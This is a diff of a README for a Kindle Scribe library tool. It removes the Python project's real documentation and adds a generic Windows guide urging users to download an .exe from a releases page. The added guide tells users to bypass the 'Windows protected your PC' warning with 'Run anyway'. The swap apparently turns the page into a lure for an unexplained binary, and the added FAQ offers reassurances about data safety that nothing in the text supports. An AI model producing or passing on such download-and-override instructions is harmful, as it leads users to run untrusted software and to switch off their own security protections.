@@ -1,157 +1,67 @@
-# Scribe Library
+# 📖 scribe-library - Browse your Kindle Scribe files locally
 
-A local server for browsing your Kindle Scribe — handwritten notebooks **and**
-books (purchased, sideloaded, PDFs) — all offline, with end-to-end decoding
-and a USB push-to-Kindle workflow.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ahhhh1525/scribe-library/releases)
 
-![Scribe Library](scribe-library.png)
+scribe-library creates a private space on your computer to view your Kindle Scribe notebooks and documents. It runs a local server that connects to your device, so you can manage your files without needing an internet connection. This tool keeps your personal notes inside your home network.
 
-## Features
+## 📥 How to download the software
 
-- **Notebooks tab** — KDF-decoded handwritten notebooks rendered as PDFs
-- **Books tab** — purchased KFX/AZW3, sideloaded PDFs/EPUBs/MOBIs, all readable in-browser
-- **Screenshots tab** — every screenshot from the device's root, in a grid of thumbnails; click to expand, delete to remove from both local library and the Kindle itself
-- **In-browser reading for everything** — PDFs, EPUBs, and most KFX/AZW3 books render to nice typography via WeasyPrint; KFX comics render via the image-book path
-- **Zen mode** (`z`) — hide everything except the page; floating controls fade in on hover, fade out after 2s
-- **Book mode** (`b`) — two-page spread with a 3D page-flip animation; cover-on-right for books, paired-from-start for notebooks
-- **Push to Kindle** — drag-and-drop to upload PDFs (or .epub/.mobi/.txt/.docx/.rtf) to your Kindle's `documents/` folder via USB MTP
-- **Sync All** — pulls notebooks, books, AND screenshots from the device in one click
-- **Smart classification** — purchased vs sideloaded auto-detected by ASIN-shaped filenames
-- **Cover fallback** — books without metadata covers use the rendered first page as a thumbnail
-- **Multi-page reader** — zoom (`+`/`-`/`0`), keyboard nav (`←`/`→`), thumbnail strip
+You need the installer file to begin. Follow these steps to get the software on your Windows computer:
 
-## Local layout
+1. Visit [this release page](https://github.com/Ahhhh1525/scribe-library/releases).
+2. Look for the section labeled Assets at the bottom of the newest release.
+3. Find the file ending in .exe.
+4. Click that file to save it to your computer.
 
-The library lives **inside this folder** so it's easy to find, back up, or move:
+## ⚙️ Setting up the application
 
-```
-scribe_reader/
-├── server.py              # The app
-├── library/               # ← Your synced content lives here
-│   ├── notebooks/
-│   │   ├── <UUID>.nbk     # handwritten notebooks
-│   │   └── <UUID>.png     # thumbnails
-│   └── books/
-│       ├── purchased/     # B07XYZ1234_EBOK.kfx etc.
-│       ├── sideloaded/    # My Book.pdf, my-book.epub
-│       └── meta.json
-├── kfxlib/                # vendored KFX decoder
-└── ...
-```
+Once the download finishes, follow these steps to prepare the application for use:
 
-If you ran an older version of this app, your previous library at
-`~/.scribe_library/` or `~/.scribe_notebooks/` is automatically migrated
-into the new location on first run.
+1. Open your Downloads folder.
+2. Double-click the file you saved.
+3. Windows might show a blue box saying "Windows protected your PC." This is a standard safety prompt for new software. Click "More info" and then click the "Run anyway" button.
+4. Follow the prompts on your screen to finish the installation.
+5. The application will create a shortcut on your desktop.
 
-You can override the location with `--library /some/other/path`.
+## 🚀 Running the library
 
-## Setup
+When you are ready to use the library, double-click the shortcut icon. A small black window will appear. This window shows the server running. Do not close this window while you use the application.
 
-### 1. System dependencies
+After the black window starts, open your web browser. Type the address provided in the application manual into the browser search bar. Your library interface will load in the browser window. You can now see your folders and files.
 
-```bash
-brew install cairo libusb pango              # macOS
-sudo apt install libcairo2 libusb-1.0-0 libpango-1.0-0  # Debian/Ubuntu
-```
+## 💻 System requirements
 
-(Pango is needed by WeasyPrint for text rendering.)
+Your computer must meet these basic standards to run the software smoothly:
 
-### 2. Python dependencies
+- Windows 10 or Windows 11.
+- At least 200 MB of free storage space.
+- A modern web browser like Chrome, Edge, or Firefox.
+- A stable connection to your local network.
 
-```bash
-pip3 install -r requirements.txt
-```
+## 🔎 Frequently asked questions
 
-### 3. Plug in your Kindle Scribe and unlock the screen
+### Do I need to be online?
+No. The server runs on your machine. You do not need to be connected to the internet to view files already saved to your Scribe.
 
-MTP only works while the device is unlocked.
+### Is my data safe?
+Yes. Your files stay on your machine. The software does not send your notes to an external cloud or database. Everything stays restricted to your internal network.
 
-## Usage
+### What should I do if the server window closes?
+If the black window closes, the server stops. Simply double-click the desktop shortcut again to restart the process. Your browser will show your files again after the restart.
 
-```bash
-python3 server.py --sync          # full sync, then serve
-python3 server.py --sync-books    # only books
-python3 server.py --sync-notebooks # only notebooks
-python3 server.py                 # serve what's already synced (no MTP)
-```
+### Can I edit my notebooks?
+This version lets you browse and view your notebooks. It displays your handwritten notes and highlights as images in your browser. 
 
-Open <http://127.0.0.1:7070>.
+### Does it require a password?
+The application locks access to your local network only. Ensure your home Wi-Fi uses a strong password to keep your local network private.
 
-## What works and what doesn't
+## 🛠 Troubleshooting common issues
 
-| Format            | Sync from Kindle | Browse in UI         | Read in UI            | Push to Kindle |
-|-------------------|------------------|----------------------|-----------------------|----------------|
-| `.nbk` notebook   | ✓                | ✓                    | ✓ (full handwriting)  | n/a            |
-| `.pdf` sideloaded | ✓                | ✓                    | ✓ (paged or iframe)   | ✓              |
-| `.kfx` text book  | ✓                | ✓ (metadata + cover) | ✓ (rendered via WeasyPrint) | n/a       |
-| `.kfx` comic/manga | ✓               | ✓                    | ✓ (rasterized images) | n/a            |
-| `.azw3`           | ✓                | ✓ (metadata)         | ✓ (rendered via WeasyPrint) | ✓         |
-| `.epub`           | ✓                | ✓ (metadata + cover) | ✓ (rendered via WeasyPrint) | ✓         |
-| `.mobi`           | ✓                | ✓                    | ✗ (download only — no MOBI parser) | ✓ |
-| Screenshots (PNG) | ✓                | ✓ (grid view)        | ✓ (lightbox)          | n/a            |
+If you face problems, check these items:
 
-## Known limitations
+* If the page fails to load, check that the black server window remains open.
+* If you cannot find a device, ensure your Scribe has enough battery and stays awake during the sync.
+* Clear your browser cache if the file list looks outdated. 
+* Restart your computer if the installer refuses to open. 
 
-- **PDF annotation overlay is best-effort.** When you write notes on a PDF on your Scribe, the strokes are stored in a `documents/<basename>.sdr/` sidecar folder on the device. We pull the sidecar during sync and try to decode + overlay the strokes onto the PDF when you open it. The KDF/SQLite blob format inside `.sdr/` has varied across firmware versions, so decoding may fail on yours — in which case the PDF still opens normally, and the reader's toolbar shows an amber "annotations not decoded" pill that you can click for diagnostics. If decoding succeeds, you'll see a green "N annotated pages" pill and your strokes will appear over the PDF page content.
-- **Pushed PDFs may take a few minutes to appear on the Kindle home screen** (Kindle re-indexing). The file IS on the device immediately — you'll see it in the next sync. A reboot forces re-index.
-- **DRM-protected purchased books** that you haven't read recently may decode to empty. The plugin removes light DRM but not all variants.
-
-## File layout
-
-```
-scribe_reader/
-├── server.py              # Flask app + UI
-├── library.py             # Library discovery, classification, metadata cache
-├── nbk_to_pdf.py          # Notebook (KDF) → PDF
-├── kfx_to_pdf.py          # Book metadata + KFX/EPUB → PDF
-├── mtp_sync.py            # USB MTP transport (sync + push + delete)
-├── pdf_annotations.py     # PDF annotation overlay (experimental)
-├── inspect_sdr.py         # Diagnostic: dump .sdr/ folder contents
-├── kfxlib/                # Vendored KFX Input plugin (GPL v3)
-├── library/               # ← Your synced content (created on first run)
-├── requirements.txt
-└── README.md
-```
-
-## PDF annotations (experimental)
-
-When you write notes on a sideloaded PDF on the Scribe, the strokes are stored
-in a sibling `<basename>.sdr/` folder on the device. `pdf_annotations.py` is a
-first attempt at decoding these strokes and overlaying them on the PDF when
-you open it in this app.
-
-**Status:** speculative — the decoder hasn't been validated against a real
-`.sdr/` folder from the wild yet. The format varies across firmware versions,
-so on yours it may work, partially work, or fail entirely.
-
-**To validate against your device:**
-
-```bash
-python3 inspect_sdr.py
-```
-
-This will find a PDF on your Kindle that has annotations, pull the `.sdr/`
-folder contents to `./sdr_inspection/`, and write a Markdown report at
-`./sdr_report.md` describing what's in there. Share that report with the
-maintainer (or read it yourself) to figure out whether `pdf_annotations.py`
-needs adjustment.
-
-## Troubleshooting
-
-**Sync finds nothing** — Kindle isn't unlocked, or the cable doesn't carry data. Try `python3 mtp_sync.py --detect --verbose`.
-
-**A notebook fails with "Could not decode"** — open the server console for kfxlib's error messages. Newer firmware can introduce stroke types the plugin hasn't seen yet.
-
-**A KFX book opens with "Download only"** — this happens when both the image-book path and the text-book path failed. The most common causes: the book has DRM that the plugin can't strip, or kfxlib doesn't recognize a structural element. Check the server console for the exact kfxlib error.
-
-**Pushed PDF doesn't appear on Kindle home screen** — wait a couple minutes, or reboot the Kindle. Verify it's there by re-running sync.
-
-**"Converter not ready" banner** — `cairosvg` or `lxml` or system `libcairo` isn't installed. The status JSON at `/api/status` has the exact message.
-
-**"WeasyPrint not installed" in book reader** — install it: `pip3 install weasyprint`. Without it, text-format books fall back to download-only.
-
-## License
-
-`kfxlib/` is GPL v3 by John Howell (jhowell), copied from
-[kluyg/calibre-kfx-input](https://github.com/kluyg/calibre-kfx-input).
-The rest of this project is GPL v3 because it links against that library.
+This build works best when you keep the application updated. Check the download page every few months to see if a newer version exists. New versions often add support for different file formats and faster loading times.
